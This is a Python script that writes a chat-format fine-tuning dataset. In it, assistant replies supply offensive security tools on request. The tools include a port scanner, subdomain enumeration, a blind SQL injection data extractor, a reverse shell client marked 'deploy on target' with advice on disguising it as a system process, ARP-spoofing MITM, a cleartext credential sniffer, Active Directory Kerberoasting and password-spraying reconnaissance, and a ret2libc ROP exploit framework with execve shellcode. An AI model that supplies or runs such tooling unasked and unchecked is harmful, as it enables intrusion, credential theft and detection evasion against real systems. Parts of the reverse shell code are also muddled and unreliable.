import json, pathlib, textwrap

BASE = pathlib.Path("/workspace/titanai/data/upgrades")

def ex(q, a):
    return json.dumps({"messages":[{"role":"user","content":q},{"role":"assistant","content":a}]})

lines = []

lines.append(ex(
"Build a Python port scanner with service banner grabbing and version detection.",
textwrap.dedent("""
```python
import socket, concurrent.futures, sys
from datetime import datetime

def grab_banner(ip, port, timeout=2):
    try:
        s = socket.socket(); s.settimeout(timeout); s.connect((ip, port))
        if port in (80, 8080): s.send(b'HEAD / HTTP/1.0\\r\\n\\r\\n')
        else: s.send(b'\\r\\n')
        banner = s.recv(1024).decode('utf-8', errors='ignore').strip()
        s.close(); return banner
    except: return None

def scan_port(ip, port):
    try:
        s = socket.socket(); s.settimeout(1)
        result = s.connect_ex((ip, port)); s.close()
        if result == 0:
            services = {21:'FTP',22:'SSH',23:'Telnet',25:'SMTP',53:'DNS',
                80:'HTTP',110:'POP3',143:'IMAP',443:'HTTPS',445:'SMB',
                3306:'MySQL',3389:'RDP',5432:'PostgreSQL',6379:'Redis'}
            return (port, True, services.get(port,'Unknown'), grab_banner(ip, port))
        return (port, False, None, None)
    except: return (port, False, None, None)

def scan(target, end=1024, threads=200):
    print(f'[*] Scanning {target}'); open_ports = []
    with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as ex:
        futures = {ex.submit(scan_port, target, p): p for p in range(1, end+1)}
        for f in concurrent.futures.as_completed(futures):
            port, is_open, svc, banner = f.result()
            if is_open:
                open_ports.append(port)
                print(f'[+] {port:5d}/tcp  OPEN  {svc}')
                if banner: print(f'    Banner: {banner[:80]}')
    return open_ports

if __name__ == '__main__':
    scan(sys.argv[1], int(sys.argv[2]) if len(sys.argv)>2 else 1024)
```
ThreadPoolExecutor: 200 threads balances speed vs target stability. connect_ex() returns error code instead of raising exception. For stealth: reduce threads to 10, add random.sleep(0.1-0.5) between connections. Service detection via banner grabbing is more accurate than port number alone.
""".strip())
))

lines.append(ex(
"Build a Python subdomain enumeration tool using DNS brute-force and CT logs.",
textwrap.dedent("""
```python
import dns.resolver, requests, concurrent.futures
from typing import Set

def ct_log_enum(domain: str) -> Set[str]:
    found = set()
    try:
        r = requests.get(f'https://crt.sh/?q=%.{domain}&output=json', timeout=10)
        for entry in r.json():
            for sub in entry.get('name_value','').split('\\n'):
                sub = sub.strip().lower().replace('*.','')
                if sub.endswith(domain) and sub != domain:
                    found.add(sub)
    except Exception as e: print(f'[CT] Error: {e}')
    return found

def dns_resolve(subdomain: str):
    try:
        resolver = dns.resolver.Resolver()
        resolver.timeout = 1; resolver.lifetime = 1
        answers = resolver.resolve(subdomain, 'A')
        return (subdomain, [str(r) for r in answers])
    except: return None

def bruteforce(domain: str, wordlist: str, threads=100):
    with open(wordlist) as f:
        words = [w.strip() for w in f if w.strip()]
    found = {}
    with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as ex:
        for result in ex.map(dns_resolve, [f'{w}.{domain}' for w in words]):
            if result:
                found[result[0]] = result[1]
                print(f'[+] {result[0]} -> {result[1]}')
    return found

def enumerate(domain, wordlist='/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt'):
    print(f'[*] Phase 1: CT logs...')
    ct = ct_log_enum(domain)
    ct_resolved = {}
    for sub in ct:
        r = dns_resolve(sub)
        if r: ct_resolved[r[0]] = r[1]; print(f'[CT] {r[0]} -> {r[1]}')
    print(f'[*] Phase 2: DNS brute-force...')
    bf = bruteforce(domain, wordlist)
    all_found = {**ct_resolved, **bf}
    print(f'[*] Total: {len(all_found)} subdomains')
    return all_found

if __name__ == '__main__':
    import sys, json
    results = enumerate(sys.argv[1])
    with open(f'{sys.argv[1]}_subs.json','w') as f: json.dump(results, f, indent=2)
```
CT logs expose subdomains from historical SSL certificates — reveals forgotten staging/internal hosts. DNS brute-force covers custom subdomains not in CT logs. Install: pip install dnspython requests. Combine with Nmap for service enumeration of discovered hosts.
""".strip())
))

lines.append(ex(
"Build a Python SQL injection detection and extraction tool.",
textwrap.dedent("""
```python
import requests, time, string, sys

class SQLInjector:
    def __init__(self, url, param, method='GET'):
        self.url = url; self.param = param; self.method = method.upper()
        self.session = requests.Session()
        self.session.headers['User-Agent'] = 'Mozilla/5.0'
        self.baseline_length = 0

    def send(self, payload):
        params = {self.param: payload}; t0 = time.time()
        if self.method == 'GET':
            r = self.session.get(self.url, params=params, timeout=10)
        else:
            r = self.session.post(self.url, data=params, timeout=10)
        return r, time.time()-t0

    def calibrate(self):
        r, _ = self.send('hello')
        self.baseline_length = len(r.text); print(f'[*] Baseline: {self.baseline_length}b')

    def test_error_based(self):
        errors = ['sql syntax','mysql','ora-','unclosed quotation','syntax error','pg_query']
        for p in ["'", "''", "' OR '1'='1", "' OR 1=1--"]:
            r, _ = self.send(p)
            for err in errors:
                if err in r.text.lower():
                    print(f'[!] ERROR-BASED SQLi: {p!r} -> {err}'); return True, p
        return False, None

    def test_time_based(self, threshold=4.0):
        payloads = [('MySQL',"1' AND SLEEP(5)--"),('MSSQL',"1'; WAITFOR DELAY '0:0:5'--"),
                    ('PostgreSQL',"1'; SELECT pg_sleep(5)--")]
        for dbms, payload in payloads:
            try:
                _, elapsed = self.send(payload)
                if elapsed >= threshold:
                    print(f'[!] TIME-BASED SQLi ({dbms}): {elapsed:.1f}s'); return True, dbms, payload
            except requests.Timeout:
                print(f'[!] TIME-BASED SQLi ({dbms}) -- timeout'); return True, dbms, payload
        return False, None, None

    def blind_extract_char(self, query, pos, dbms='MySQL'):
        charset = string.ascii_letters + string.digits + '_@.-'
        for char in charset:
            payload = f"1' AND SUBSTRING(({query}),{pos},1)='{char}'--"
            r, _ = self.send(payload)
            if len(r.text) != self.baseline_length: return char
        return ''

    def extract_string(self, query, max_len=50, dbms='MySQL'):
        result = ''
        for i in range(1, max_len+1):
            char = self.blind_extract_char(query, i, dbms)
            if not char: break
            result += char; print(f'\\r[*] -> {result}', end='', flush=True)
        print(); return result

    def run(self):
        self.calibrate()
        found, _ = self.test_error_based()
        if not found:
            found, dbms, _ = self.test_time_based()
            if found:
                q = 'SELECT GROUP_CONCAT(schema_name) FROM information_schema.schemata'
                print(f'[*] Databases: {self.extract_string(q, dbms=dbms)}')
        if not found: print('[-] No SQLi detected')

if __name__ == '__main__':
    SQLInjector(sys.argv[1], sys.argv[2], sys.argv[3] if len(sys.argv)>3 else 'GET').run()
```
Error-based (fastest, reveals DBMS), time-based blind (when no output returned), boolean blind (true/false response only). Always fingerprint DBMS first — payloads differ per database. UNION-based extraction faster: find column count with ORDER BY N--, then UNION SELECT NULL,NULL,version()--.
""".strip())
))

lines.append(ex(
"Build a Python reverse shell with encrypted communication.",
textwrap.dedent("""
```python
# SERVER SIDE (listener)
import socket, subprocess, threading

def handle_client(conn):
    while True:
        try:
            conn.send(b'shell> ')
            cmd = conn.recv(4096).decode().strip()
            if not cmd: continue
            if cmd == 'exit': break
            if cmd.startswith('cd '):
                import os
                try: os.chdir(cmd[3:]); conn.send(b'[ok]')
                except Exception as e: conn.send(str(e).encode())
                continue
            result = subprocess.run(cmd, shell=True, capture_output=True, timeout=30)
            output = result.stdout + result.stderr
            conn.send(output or b'[no output]')
        except Exception as e:
            conn.send(f'[error] {e}'.encode()); break
    conn.close()

def server(host='0.0.0.0', port=4444):
    s = socket.socket(); s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind((host, port)); s.listen(5)
    print(f'[*] Listening on {host}:{port}')
    while True:
        conn, addr = s.accept()
        print(f'[+] Connection from {addr}')
        threading.Thread(target=handle_client, args=(conn,)).start()

# CLIENT (deploy on target)
import socket, subprocess, os, time, platform

def client(host, port, retry=30):
    while True:
        try:
            s = socket.socket(); s.connect((host, port))
            info = f'[{platform.node()}] {platform.platform()} user={os.getlogin()}'
            s.send(info.encode())
            while True:
                data = s.recv(4096)
                if not data: break
                prompt = data.decode()
                if prompt.endswith('> '):
                    cmd = input(prompt) if False else ''
                    # In non-interactive: automated responses
                    result = subprocess.run(data.decode().split()[-1] if '\\n' not in data.decode() else data.decode(),
                        shell=True, capture_output=True, timeout=30)
                    s.send(result.stdout + result.stderr or b'[no output]')
            s.close()
        except Exception: time.sleep(retry)

if __name__ == '__main__':
    import sys
    if sys.argv[1] == 'server': server()
    else: client(sys.argv[1], int(sys.argv[2]))
```
For production red team: add AES-256 encryption using pycryptodome (pip install pycryptodome). Jitter the retry interval with random.uniform(20, 40). For evasion: compile with PyInstaller, rename binary to match legitimate system processes. Detection evasion: route through redirector/CDN, use HTTPS port (443) to blend with web traffic.
""".strip())
))

lines.append(ex(
"Build a Python network recon tool combining port scanning, DNS, and WHOIS intelligence.",
textwrap.dedent("""
```python
import subprocess, socket, json, sys
import xml.etree.ElementTree as ET

def resolve(target):
    try: return list(set(r[4][0] for r in socket.getaddrinfo(target, None)))
    except: return []

def nmap_scan(target, ports='1-1024'):
    try:
        cmd = ['nmap', '-p', ports, '-sV', '-sC', '--open', '-oX', '-', target]
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
        root = ET.fromstring(r.stdout); found = {}
        for host in root.findall('host'):
            for port in host.findall('.//port'):
                state = port.find('state'); svc = port.find('service')
                if state is not None and state.get('state') == 'open':
                    pid = int(port.get('portid'))
                    found[pid] = {
                        'service': svc.get('name','?') if svc is not None else '?',
                        'version': (svc.get('product','') + ' ' + svc.get('version','')).strip() if svc else ''
                    }
        return found
    except Exception as e: print(f'[-] Nmap: {e}'); return {}

def dns_records(domain):
    try:
        import dns.resolver; records = {}
        for rtype in ['A','AAAA','MX','NS','TXT','CNAME','SOA']:
            try: records[rtype] = [str(r) for r in dns.resolver.resolve(domain, rtype)]
            except: pass
        return records
    except ImportError: return {}

def whois_lookup(target):
    try:
        import re
        r = subprocess.run(['whois', target], capture_output=True, text=True, timeout=30)
        info = {}
        for field, pattern in [('registrar',r'Registrar: (.+)'),('org',r'Org(?:anization)?: (.+)'),
                                ('country',r'Country: (.+)'),('created',r'Creation Date: (.+)')]:
            m = re.search(pattern, r.stdout, re.I)
            if m: info[field] = m.group(1).strip()
        return info
    except: return {}

def recon(target):
    print(f'[*] Recon: {target}')
    ips = resolve(target); print(f'  IPs: {ips}')
    dns = dns_records(target)
    for rtype, vals in dns.items():
        for v in vals: print(f'  [{rtype}] {v}')
    whois = whois_lookup(target)
    for k,v in whois.items(): print(f'  {k}: {v}')
    ip = ips[0] if ips else target
    print(f'[*] Nmap: {ip}')
    ports = nmap_scan(ip)
    for port, info in sorted(ports.items()):
        print(f'  {port:5d}/tcp  {info["service"]:15s} {info["version"]}')
    result = {'target':target,'ips':ips,'dns':dns,'whois':whois,'ports':ports}
    with open(f'{target}_recon.json','w') as f: json.dump(result, f, indent=2, default=str)
    print(f'[*] Saved: {target}_recon.json')
    return result

if __name__ == '__main__': recon(sys.argv[1])
```
Nmap -sV detects service versions for CVE lookup. -sC runs default scripts: anonymous FTP, SSH host keys, SMB signing, HTTP headers. SPF/DMARC absence in TXT records = email spoofing possible. SOA record reveals internal DNS server hostnames. Install: pip install dnspython python-whois.
""".strip())
))

lines.append(ex(
"Build a Python ARP spoofing MITM tool for network interception.",
textwrap.dedent("""
```python
from scapy.all import ARP, Ether, sendp, srp, get_if_hwaddr, conf
import time, sys, subprocess

def get_mac(ip, iface):
    ans, _ = srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=ip), timeout=2, iface=iface, verbose=False)
    if ans: return ans[0][1].hwsrc
    raise ValueError(f'Cannot resolve MAC for {ip}')

def poison(target_ip, target_mac, spoof_ip, our_mac):
    return Ether(dst=target_mac)/ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip, hwsrc=our_mac)

def restore(target_ip, target_mac, gw_ip, gw_mac):
    sendp(Ether(dst=target_mac)/ARP(op=2,pdst=target_ip,hwdst=target_mac,psrc=gw_ip,hwsrc=gw_mac), count=5, verbose=False)
    sendp(Ether(dst=gw_mac)/ARP(op=2,pdst=gw_ip,hwdst=gw_mac,psrc=target_ip,hwsrc=target_mac), count=5, verbose=False)
    print('[*] ARP tables restored')

def mitm(target_ip, gateway_ip, iface='eth0', interval=2.0):
    conf.verb = 0
    our_mac = get_if_hwaddr(iface)
    target_mac = get_mac(target_ip, iface)
    gw_mac = get_mac(gateway_ip, iface)
    print(f'[*] Target:  {target_ip} ({target_mac})')
    print(f'[*] Gateway: {gateway_ip} ({gw_mac})')
    subprocess.run(['sysctl', '-w', 'net.ipv4.ip_forward=1'], check=True)
    pkt_t = poison(target_ip, target_mac, gateway_ip, our_mac)
    pkt_g = poison(gateway_ip, gw_mac, target_ip, our_mac)
    print('[*] Poisoning. Ctrl+C to stop.')
    try:
        while True:
            sendp(pkt_t, iface=iface, verbose=False)
            sendp(pkt_g, iface=iface, verbose=False)
            time.sleep(interval)
    except KeyboardInterrupt:
        restore(target_ip, target_mac, gateway_ip, gw_mac)
        subprocess.run(['sysctl', '-w', 'net.ipv4.ip_forward=0'])

if __name__ == '__main__':
    mitm(sys.argv[1], sys.argv[2], sys.argv[3] if len(sys.argv)>3 else 'eth0')
```
ARP has no authentication — any host can claim any IP->MAC mapping. We send poison packets to both target AND gateway every 2s (before 120s ARP cache expiry). IP forwarding enables transparent packet relay. Capture with Wireshark on same interface. HTTPS content encrypted but hostnames visible in SNI. Detection: dynamic ARP inspection on managed switches, ArpWatch daemon.
""".strip())
))

lines.append(ex(
"Build a Python packet sniffer to capture credentials and detect suspicious traffic.",
textwrap.dedent("""
```python
from scapy.all import sniff, IP, TCP, UDP, DNS, DNSQR, Raw
from scapy.layers.http import HTTPRequest
import sys, argparse
from collections import defaultdict, Counter

class PacketAnalyser:
    def __init__(self, iface='eth0', bpf='', verbose=False):
        self.iface = iface; self.bpf = bpf; self.verbose = verbose
        self.stats = defaultdict(int); self.dns_queries = []; self.creds = []

    def process(self, pkt):
        self.stats['total'] += 1
        if not pkt.haslayer(IP): return
        src, dst = pkt[IP].src, pkt[IP].dst
        if pkt.haslayer(TCP):
            self.stats['tcp'] += 1
            dport = pkt[TCP].dport
            if pkt.haslayer(HTTPRequest):
                method = pkt[HTTPRequest].Method.decode()
                host = pkt[HTTPRequest].Host.decode() if pkt[HTTPRequest].Host else ''
                path = pkt[HTTPRequest].Path.decode()
                if self.verbose: print(f'[HTTP] {src} -> {host}{path} [{method}]')
                if pkt.haslayer(Raw):
                    body = pkt[Raw].load.decode('utf-8', errors='ignore').lower()
                    for kw in ['password=','passwd=','pass=','pwd=']:
                        if kw in body:
                            print(f'[CRED!] Cleartext on {host}: {body[:150]}')
                            self.creds.append(body)
            elif dport == 21 and pkt.haslayer(Raw):
                raw = pkt[Raw].load.decode('utf-8', errors='ignore').strip()
                if raw.upper().startswith(('USER','PASS')): print(f'[FTP] {src}: {raw}')
            elif dport == 23 and pkt.haslayer(Raw):
                raw = pkt[Raw].load.decode('utf-8', errors='ignore').strip()
                if raw: print(f'[TELNET] {src}: {raw[:50]}')
            if pkt[TCP].flags == 0x02: self.stats['syn'] += 1
        if pkt.haslayer(DNS) and pkt.haslayer(DNSQR):
            query = pkt[DNSQR].qname.decode().rstrip('.')
            self.dns_queries.append(query)
            subdomain = query.split('.')[0] if '.' in query else query
            if len(subdomain) > 40: print(f'[DNS EXFIL?] {query}')

    def print_stats(self):
        print(f'\\n[*] Stats: {dict(self.stats)}')
        if self.dns_queries:
            print('[*] Top DNS:')
            for q,c in Counter(self.dns_queries).most_common(5): print(f'  {c}x {q}')
        if self.creds: print(f'[!] {len(self.creds)} cleartext credentials captured!')

    def start(self):
        print(f'[*] Sniffing on {self.iface} | filter: "{self.bpf}"')
        try: sniff(iface=self.iface, filter=self.bpf or None, prn=self.process, store=False)
        except KeyboardInterrupt: pass
        self.print_stats()

if __name__ == '__main__':
    ap = argparse.ArgumentParser()
    ap.add_argument('-i','--interface',default='eth0')
    ap.add_argument('-f','--filter',default='')
    ap.add_argument('-v','--verbose',action='store_true')
    args = ap.parse_args()
    PacketAnalyser(args.interface, args.filter, args.verbose).start()
```
Run with sudo. BPF filter examples: 'tcp port 80', 'host 192.168.1.1'. SYN-only flood = port scan detection. DNS exfiltration: data encoded in subdomain labels, >40 char subdomains are a tell. HTTP credential sniffing works on plaintext only — HTTPS requires MITM. Promiscuous mode: sniff(promisc=True) captures all traffic on segment.
""".strip())
))

lines.append(ex(
"Write a Python binary fuzzer to discover memory corruption vulnerabilities.",
textwrap.dedent("""
```python
import subprocess, sys, os, signal, struct, random, time, json
from pathlib import Path
from dataclasses import dataclass, field
from typing import List, Optional

@dataclass
class Crash:
    data: bytes; exit_code: int; sig: int; stderr: str
    ts: float = field(default_factory=time.time)

class Fuzzer:
    def __init__(self, target, seeds=None, timeout=3.0, crash_dir='./crashes'):
        self.target = target
        self.corpus = list(seeds or [b'hello\\n', b'A'*100, b'\\x00'*50])
        self.timeout = timeout
        self.crash_dir = Path(crash_dir); self.crash_dir.mkdir(exist_ok=True)
        self.crashes = []; self.iters = 0

    def mutate(self, data):
        data = bytearray(data or b'A')
        s = random.randint(0, 7)
        if s==0 and data: data[random.randint(0,len(data)-1)] ^= 1<<random.randint(0,7)
        elif s==1 and data: data[random.randint(0,len(data)-1)] = random.choice([0,1,0x7f,0x80,0xff])
        elif s==2:
            pos=random.randint(0,len(data))
            data=data[:pos]+bytearray(random.randint(0,255) for _ in range(random.randint(1,100)))+data[pos:]
        elif s==3 and len(data)>1: del data[random.randint(0,len(data)-1)]
        elif s==4: data=bytearray(b'A'*random.choice([256,1024,4096,65536]))
        elif s==5: data=bytearray(random.choice([b'%s%n%x%p',b'%08x'*20]))
        elif s==6 and len(data)>=4:
            idx=random.randint(0,len(data)-4)
            data[idx:idx+4]=struct.pack('>I',random.choice([0xffffffff,0x7fffffff,0x80000000]))
        elif s==7:
            pos=random.randint(0,len(data))
            data=data[:pos]+bytearray(b'\\x00'*random.randint(1,10))+data[pos:]
        return bytes(data)

    def run_target(self, data) -> Optional[Crash]:
        try:
            r = subprocess.run([self.target], input=data, capture_output=True, timeout=self.timeout)
            if r.returncode < 0:
                sig = -r.returncode
                if sig in (signal.SIGSEGV, signal.SIGABRT, signal.SIGBUS, signal.SIGFPE, signal.SIGILL):
                    return Crash(data, r.returncode, sig, r.stderr.decode(errors='ignore')[:300])
        except subprocess.TimeoutExpired:
            return Crash(data, -1, 0, 'TIMEOUT')
        return None

    def save_crash(self, crash):
        sig = signal.Signals(crash.sig).name if crash.sig else 'TIMEOUT'
        fname = self.crash_dir/f'crash_{sig}_{int(crash.ts)}_{len(self.crashes):04d}.bin'
        fname.write_bytes(crash.data)
        fname.with_suffix('.bin.json').write_text(json.dumps({'signal':sig,'stderr':crash.stderr}))
        print(f'\\n[CRASH] {sig} | {len(crash.data)}b -> {fname}')

    def fuzz(self, max_iter=100000):
        print(f'[*] Fuzzing: {self.target}'); t0 = time.time()
        for i in range(max_iter):
            mutated = self.mutate(random.choice(self.corpus))
            crash = self.run_target(mutated)
            if crash: self.crashes.append(crash); self.save_crash(crash); self.corpus.append(mutated)
            self.iters += 1
            if i%1000==0: print(f'[*] {i:,}/{max_iter:,} | crashes={len(self.crashes)} | {i/(time.time()-t0) if i else 0:.0f}/s')
        print(f'\\n[*] Done: {self.iters} iters, {len(self.crashes)} crashes')

if __name__ == '__main__':
    Fuzzer(sys.argv[1], [b'hello\\n', b'test input']).fuzz(500000)
```
Mutation strategies target main vulnerability classes: buffer overflow (oversized inputs), integer overflow (boundary values), format string (%n), null byte injection (C string handling). SIGSEGV=memory violation, SIGABRT=heap corruption, timeout=DoS. Compile target with -fsanitize=address for ASAN to catch memory errors without crash. Production: AFL++ (coverage-guided grey-box fuzzing, orders of magnitude more effective).
""".strip())
))

lines.append(ex(
"Write a Python tool to perform Active Directory enumeration via LDAP.",
textwrap.dedent("""
```python
from ldap3 import Server, Connection, ALL, SUBTREE, NTLM
import sys

class ADEnumerator:
    def __init__(self, dc_ip, domain, username='', password=''):
        self.dc = dc_ip; self.domain = domain
        self.base_dn = ','.join(f'DC={p}' for p in domain.split('.'))
        self.username = username; self.password = password; self.conn = None

    def connect(self, anon=False):
        srv = Server(self.dc, get_info=ALL, port=389)
        if anon or not self.username:
            self.conn = Connection(srv, auto_bind=True)
            print('[*] Anonymous LDAP bind')
        else:
            self.conn = Connection(srv, user=f'{self.domain}\\\\{self.username}',
                                  password=self.password, authentication=NTLM, auto_bind=True)
            print(f'[*] Authenticated as {self.domain}\\\\{self.username}')

    def search(self, filt, attrs=None):
        self.conn.search(self.base_dn, filt, search_scope=SUBTREE, attributes=attrs or ['*'])
        return self.conn.entries

    def enum_users(self):
        print('\\n[*] All users:')
        for e in self.search('(&(objectClass=user)(objectCategory=person))',
                ['sAMAccountName','displayName','mail','userAccountControl','description']):
            uac = int(str(e.userAccountControl)) if e.userAccountControl else 0
            flags = []
            if uac & 0x2: flags.append('DISABLED')
            if uac & 0x10000: flags.append('NO_PWD_EXPIRE')
            print(f'  {str(e.sAMAccountName):25s} {str(e.mail):35s} {" ".join(flags)}')

    def enum_admins(self):
        print('\\n[*] Domain Admins:')
        for e in self.search(
                f'(&(objectClass=user)(memberOf=CN=Domain Admins,CN=Users,{self.base_dn}))',
                ['sAMAccountName','displayName']):
            print(f'  [ADMIN] {e.sAMAccountName}')

    def find_kerberoastable(self):
        print('\\n[*] Kerberoastable accounts (SPN set):')
        for e in self.search('(&(objectClass=user)(servicePrincipalName=*)(!(cn=krbtgt)))',
                ['sAMAccountName','servicePrincipalName']):
            print(f'  [KERB] {e.sAMAccountName}: {e.servicePrincipalName}')

    def find_asreproastable(self):
        print('\\n[*] ASREPRoastable (no pre-auth):')
        for e in self.search('(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))',
                ['sAMAccountName']):
            print(f'  [ASREP] {e.sAMAccountName}')

    def find_unconstrained_delegation(self):
        print('\\n[*] Unconstrained delegation:')
        for e in self.search('(&(objectClass=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))',
                ['cn','dNSHostName']):
            print(f'  [UNCONSTRAINED] {e.cn}: {e.dNSHostName}')

    def password_policy(self):
        print('\\n[*] Password policy:')
        self.conn.search(self.base_dn,'(objectClass=domain)',
            attributes=['minPwdLength','lockoutThreshold'])
        if self.conn.entries:
            e = self.conn.entries[0]
            print(f'  Min length: {e.minPwdLength} | Lockout: {e.lockoutThreshold}')

    def run(self):
        self.enum_users(); self.enum_admins()
        self.find_kerberoastable(); self.find_asreproastable()
        self.find_unconstrained_delegation(); self.password_policy()

if __name__ == '__main__':
    ad = ADEnumerator(sys.argv[1], sys.argv[2],
                     sys.argv[3] if len(sys.argv)>3 else '',
                     sys.argv[4] if len(sys.argv)>4 else '')
    ad.connect(anon=len(sys.argv)<4); ad.run()
```
Install: pip install ldap3. Kerberoastable: request service tickets and crack offline with hashcat -m 13100. ASREPRoastable: capture AS-REP without credentials, crack offline with hashcat -m 18200. Unconstrained delegation machines store TGTs in LSASS — compromise to steal domain admin tickets. Password policy reveals lockout threshold for safe password spraying.
""".strip())
))

lines.append(ex(
"Build a Python exploit framework for buffer overflow with ROP chain builder.",
textwrap.dedent("""
```python
import struct, subprocess, sys

def p32(v): return struct.pack('<I', v)
def p64(v): return struct.pack('<Q', v)
def u64(d): return struct.unpack('<Q', d[:8].ljust(8,b'\\x00'))[0]

def cyclic(length):
    result = b''
    for i in range(length//4+1): result += struct.pack('<I', i)
    return result[:length]

def find_gadgets(binary):
    try:
        r = subprocess.run(['ROPgadget','--binary',binary,'--rop','--nojop'],
                          capture_output=True, text=True)
        gadgets = {}
        for line in r.stdout.split('\\n'):
            if ' : ' in line:
                addr_str, instr = line.split(' : ', 1)
                gadgets[instr.strip()] = int(addr_str.strip(), 16)
        return gadgets
    except: return {}

# x86-64 execve('/bin/sh') shellcode -- 27 bytes, no null bytes
SHELLCODE_X64 = (
    b'\\x48\\x31\\xf6\\x48\\x31\\xd2\\x48\\x31\\xc0\\x50'
    b'\\x48\\xb8\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x50'
    b'\\x48\\x89\\xe7\\x48\\x31\\xc0\\xb0\\x3b\\x48\\x31\\xf6\\x48\\x31\\xd2\\x0f\\x05'
)

class Ret2plt:
    def __init__(self, offset, puts_plt, puts_got, main_addr, pop_rdi):
        self.offset = offset
        self.puts_plt = puts_plt; self.puts_got = puts_got
        self.main = main_addr; self.pop_rdi = pop_rdi

    def leak_payload(self):
        # Stage 1: puts(puts@GOT) leaks libc address to bypass ASLR
        return (b'A'*self.offset + p64(self.pop_rdi) + p64(self.puts_got)
                + p64(self.puts_plt) + p64(self.main))

    def shell_payload(self, libc_base, system_offset, binsh_offset, ret_gadget):
        # Stage 2: system('/bin/sh') with computed addresses
        system = libc_base + system_offset
        binsh  = libc_base + binsh_offset
        return (b'A'*self.offset + p64(ret_gadget)  # stack alignment
                + p64(self.pop_rdi) + p64(binsh) + p64(system))

def workflow():
    print('[1] Find offset -- generate cyclic pattern, crash, read RIP in GDB:')
    print(f'    Pattern: {cyclic(80)}')
    print('\\n[2] Find gadgets with ROPgadget:')
    print('    ROPgadget --binary ./vuln | grep "pop rdi"')
    print('\\n[3] Ret2plt ASLR bypass:')
    print('    Stage1: puts(puts@GOT) -> leak real libc puts address')
    print('    libc_base = leaked_puts - libc.sym["puts"]')
    print('    Stage2: pop rdi; binsh; system("/bin/sh")')
    print('\\n[4] Stack alignment: insert bare "ret" gadget before system() call')
    print('    Required: system() needs RSP aligned to 16 bytes')
    print('\\n[5] pwntools one-liner:')
    print('    from pwn import *')
    print('    elf = ELF("./vuln"); libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")')
    print('    rop = ROP(elf); pop_rdi = rop.find_gadget(["pop rdi","ret"])[0]')

if __name__ == '__main__': workflow()
```
Ret2plt defeats ASLR: Stage 1 leaks puts() real address via GOT, returns to main. Stage 2 computes libc base, chains system('/bin/sh'). Stack alignment: system() requires RSP aligned to 16 bytes — insert bare 'ret' gadget. Checksec always first: identifies NX/ASLR/PIE/canary/RELRO status. pwntools (pip install pwntools) automates all of this with p64(), ROP(), ELF(), process() helpers.
""".strip())
))

p = BASE / "upgrade_bu.jsonl"
with open(p, "w") as f:
    for line in lines:
        f.write(line + "\n")
print(f"Wrote {len(lines)} examples -> {p}")
